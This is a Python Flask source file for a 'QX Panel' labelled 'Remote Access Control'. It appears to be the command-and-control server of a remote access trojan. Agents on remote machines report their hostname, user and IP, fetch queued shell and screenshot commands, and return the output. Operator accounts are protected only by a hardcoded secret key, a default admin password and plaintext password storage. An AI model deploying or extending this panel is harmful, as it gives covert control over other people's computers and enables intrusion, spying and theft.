from flask import Flask, request, render_template_string, jsonify, redirect, url_for, session
import time
import os
import json
import secrets
import string
from datetime import datetime

app = Flask(__name__)
app.secret_key = "qx_secret_key_change_this_987"

USERS_FILE = "users.json"

def load_users():
    if os.path.exists(USERS_FILE):
        try:
            with open(USERS_FILE, "r") as f:
                return json.load(f)
        except:
            pass
    return {"admin": "admin123"}

def save_users(users_dict):
    with open(USERS_FILE, "w") as f:
        json.dump(users_dict, f, indent=2)

users = load_users()
agents = {}
commands = {}
results = {}

HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>QX Panel</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Inter', sans-serif;
            background: #030306;
            color: #e4e4e7;
            min-height: 100vh;
            overflow-x: hidden;
        }
        #particles {
            position: fixed; top: 0; left: 0;
            width: 100%; height: 100%;
            z-index: 0; pointer-events: none;
        }
        .container {
            position: relative; z-index: 1;
            max-width: 920px; margin: 0 auto;
            padding: 40px 24px 60px;
        }
        .header { text-align: center; margin-bottom: 40px; }
        .header h1 {
            font-size: 34px; font-weight: 700; letter-spacing: -1px;
            background: linear-gradient(135deg, #00e5ff, #0077ff);
            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
            margin-bottom: 6px;
        }
        .header p { color: #3f3f46; font-size: 13px; }
        .card {
            background: rgba(16, 16, 24, 0.75);
            border: 1px solid rgba(255,255,255,0.06);
            border-radius: 18px; padding: 24px; margin-bottom: 18px;
            backdrop-filter: blur(16px);
            transition: border-color 0.25s ease;
        }
        .card:hover { border-color: rgba(0, 212, 255, 0.12); }
        .card h3 {
            font-size: 11px; font-weight: 600; text-transform: uppercase;
            letter-spacing: 1.2px; color: #52525b; margin-bottom: 16px;
        }
        .agent {
            display: flex; align-items: center; justify-content: space-between;
            padding: 14px 16px; background: rgba(255,255,255,0.025);
            border-radius: 12px; margin-bottom: 8px;
        }
        .agent-name { font-weight: 600; font-size: 14px; color: #f4f4f5; }
        .agent-meta { font-size: 12px; color: #52525b; margin-top: 3px; }
        .status {
            display: flex; align-items: center; gap: 7px;
            font-size: 11px; font-weight: 600;
            padding: 5px 12px; border-radius: 20px;
        }
        .status.online { background: rgba(0,255,157,0.1); color: #00ff9d; }
        .status.offline { background: rgba(255,70,70,0.1); color: #ff5555; }
        .status-dot { width: 6px; height: 6px; border-radius: 50%; background: currentColor; }
        .status.online .status-dot { animation: pulse 1.6s ease infinite; }
        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.35; } }
        .form-group { margin-bottom: 12px; }
        input, select {
            width: 100%; padding: 13px 16px;
            background: rgba(255,255,255,0.04);
            border: 1px solid rgba(255,255,255,0.07);
            border-radius: 12px; color: #f4f4f5;
            font-size: 14px; font-family: inherit; outline: none;
            transition: border-color 0.2s, box-shadow 0.2s;
        }
        input:focus, select:focus {
            border-color: rgba(0,212,255,0.4);
            box-shadow: 0 0 0 3px rgba(0,212,255,0.08);
        }
        select option { background: #12121a; }
        button {
            display: inline-block; width: 100%; padding: 13px;
            background: linear-gradient(135deg, #00e5ff, #0077ff);
            color: #030306; font-size: 14px; font-weight: 600;
            font-family: inherit; border: none; border-radius: 12px;
            cursor: pointer; transition: transform 0.15s, box-shadow 0.2s;
        }
        button:hover {
            transform: translateY(-1px);
            box-shadow: 0 8px 28px rgba(0,180,255,0.25);
        }
        pre {
            background: rgba(0,0,0,0.35);
            border: 1px solid rgba(255,255,255,0.04);
            border-radius: 10px; padding: 13px 15px;
            font-size: 12.5px; line-height: 1.55; color: #d4d4d8;
            white-space: pre-wrap; word-break: break-all; margin-bottom: 10px;
        }
        .empty { color: #3f3f46; font-size: 13px; text-align: center; padding: 18px 0; }
        .login-wrap { max-width: 380px; margin: 100px auto 0; }
        .login-wrap h2 { text-align: center; font-size: 24px; margin-bottom: 28px; color: #f4f4f5; }
        .top-bar {
            display: flex; justify-content: space-between; align-items: center; margin-bottom: 28px;
        }
        .top-bar .user { font-size: 13px; color: #71717a; }
        .top-bar a { color: #52525b; font-size: 13px; text-decoration: none; }
        .top-bar a:hover { color: #00e5ff; }
        .generated {
            margin-top: 12px; padding: 12px;
            background: rgba(0,255,157,0.07); border-radius: 10px;
            font-size: 13px; color: #00ff9d; word-break: break-all;
        }
        .user-list { margin-top: 12px; font-size: 13px; color: #a1a1aa; }
        .user-list span {
            display: inline-block; background: rgba(255,255,255,0.05);
            padding: 4px 10px; border-radius: 8px; margin: 3px;
        }
    </style>
</head>
<body>
    <canvas id="particles"></canvas>
    <div class="container">

        {% if not session.get('logged_in') %}
        <div class="login-wrap">
            <div class="card">
                <h2>QX Panel</h2>
                <form method="POST" action="/login">
                    <div class="form-group">
                        <input type="text" name="username" placeholder="Username" required autofocus>
                    </div>
                    <div class="form-group">
                        <input type="password" name="password" placeholder="Password" required>
                    </div>
                    <button type="submit">Login</button>
                </form>
            </div>
        </div>

        {% else %}
        <div class="header">
            <h1>QX Panel</h1>
            <p>Remote Access Control</p>
        </div>

        <div class="top-bar">
            <span class="user">Logged in as <b>{{ session.get('username') }}</b></span>
            <a href="/logout">Logout</a>
        </div>

        <div class="card">
            <h3>Agents</h3>
            {% if agents %}
                {% for aid, info in agents.items() %}
                <div class="agent">
                    <div>
                        <div class="agent-name">{{ info.hostname }}</div>
                        <div class="agent-meta">{{ info.user }} · {{ info.ip }} · {{ info.last_seen_str }}</div>
                    </div>
                    <div class="status {{ 'online' if (now - info.last_seen) < 35 else 'offline' }}">
                        <span class="status-dot"></span>
                        {{ 'ONLINE' if (now - info.last_seen) < 35 else 'OFFLINE' }}
                    </div>
                </div>
                {% endfor %}
            {% else %}
                <p class="empty">No agents connected</p>
            {% endif %}
        </div>

        <div class="card">
            <h3>Send Command</h3>
            <form method="POST" action="/send">
                <div class="form-group">
                    <select name="agent_id">
                        {% for aid, info in agents.items() %}
                        <option value="{{ aid }}">{{ info.hostname }} — {{ info.user }}</option>
                        {% endfor %}
                    </select>
                </div>
                <div class="form-group">
                    <input type="text" name="cmd" placeholder="info · shell whoami · shell dir · ss ..." required autocomplete="off">
                </div>
                <button type="submit">Send Command</button>
            </form>
        </div>

        <div class="card">
            <h3>Results</h3>
            {% if results %}
                {% for aid, res_list in results.items() %}
                    <div style="margin-bottom:14px;">
                        <div style="font-size:12px;color:#71717a;margin-bottom:6px;">{{ agents[aid].hostname if aid in agents else aid }}</div>
                        {% for r in res_list[-5:] %}
                        <pre>{{ r }}</pre>
                        {% endfor %}
                    </div>
                {% endfor %}
            {% else %}
                <p class="empty">No results yet</p>
            {% endif %}
        </div>

        {% if session.get('username') == 'admin' %}
        <div class="card">
            <h3>Admin — Create Account</h3>
            <form method="POST" action="/create_user">
                <div class="form-group">
                    <input type="text" name="new_username" placeholder="New username" required>
                </div>
                <button type="submit">Generate Account</button>
            </form>

            {% if generated %}
            <div class="generated">
                Username: <b>{{ generated.username }}</b><br>
                Password: <b>{{ generated.password }}</b><br>
                <small style="opacity:0.7">Sačuvaj ovo! Nalog se sada čuva u fajlu.</small>
            </div>
            {% endif %}

            <div class="user-list">
                Existing users:
                {% for u in users.keys() %}
                <span>{{ u }}</span>
                {% endfor %}
            </div>
        </div>
        {% endif %}

        {% endif %}
    </div>

    <script>
        const canvas = document.getElementById('particles');
        const ctx = canvas.getContext('2d');
        let particles = [];
        function resize() {
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
        }
        window.addEventListener('resize', resize);
        resize();
        class Particle {
            constructor() {
                this.x = Math.random() * canvas.width;
                this.y = Math.random() * canvas.height;
                this.size = Math.random() * 1.8 + 0.4;
                this.speedX = (Math.random() - 0.5) * 0.35;
                this.speedY = (Math.random() - 0.5) * 0.35;
                this.opacity = Math.random() * 0.4 + 0.1;
            }
            update() {
                this.x += this.speedX;
                this.y += this.speedY;
                if (this.x < 0 || this.x > canvas.width) this.speedX *= -1;
                if (this.y < 0 || this.y > canvas.height) this.speedY *= -1;
            }
            draw() {
                ctx.beginPath();
                ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
                ctx.fillStyle = `rgba(0, 200, 255, ${this.opacity})`;
                ctx.fill();
            }
        }
        for (let i = 0; i < 55; i++) particles.push(new Particle());
        function animate() {
            ctx.clearRect(0, 0, canvas.width, canvas.height);
            particles.forEach(p => { p.update(); p.draw(); });
            requestAnimationFrame(animate);
        }
        animate();
    </script>
</body>
</html>
"""

@app.route("/")
def index():
    now = time.time()
    for aid in list(agents.keys()):
        agents[aid]["last_seen_str"] = datetime.fromtimestamp(agents[aid]["last_seen"]).strftime("%H:%M:%S")
    generated = session.pop("generated", None)
    return render_template_string(HTML, agents=agents, results=results, now=now,
                                  session=session, users=users, generated=generated)

@app.route("/login", methods=["POST"])
def login():
    global users
    users = load_users()
    username = request.form.get("username", "").strip()
    password = request.form.get("password", "")
    if username in users and users[username] == password:
        session["logged_in"] = True
        session["username"] = username
    return redirect(url_for("index"))

@app.route("/logout")
def logout():
    session.clear()
    return redirect(url_for("index"))

@app.route("/send", methods=["POST"])
def send():
    if not session.get("logged_in"):
        return redirect(url_for("index"))
    aid = request.form.get("agent_id")
    cmd = request.form.get("cmd", "").strip()
    if aid and cmd:
        commands[aid] = cmd
    return redirect(url_for("index"))

@app.route("/create_user", methods=["POST"])
def create_user():
    global users
    if not session.get("logged_in") or session.get("username") != "admin":
        return redirect(url_for("index"))
    users = load_users()
    new_username = request.form.get("new_username", "").strip().lower()
    if new_username and new_username not in users:
        alphabet = string.ascii_letters + string.digits
        password = ''.join(secrets.choice(alphabet) for _ in range(12))
        users[new_username] = password
        save_users(users)
        session["generated"] = {"username": new_username, "password": password}
    return redirect(url_for("index"))

@app.route("/api/check", methods=["POST"])
def api_check():
    data = request.json or {}
    aid = data.get("id")
    if not aid:
        return jsonify({"cmd": None})
    agents[aid] = {
        "hostname": data.get("hostname", "?"),
        "user": data.get("user", "?"),
        "ip": data.get("ip", "?"),
        "last_seen": time.time()
    }
    cmd = commands.pop(aid, None)
    return jsonify({"cmd": cmd})

@app.route("/api/result", methods=["POST"])
def api_result():
    data = request.json or {}
    aid = data.get("id")
    result = data.get("result", "")
    if not aid:
        return jsonify({"ok": False})
    if aid not in results:
        results[aid] = []
    results[aid].append(f"[{datetime.now().strftime('%H:%M:%S')}] {result}")
    results[aid] = results[aid][-12:]
    return jsonify({"ok": True})

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
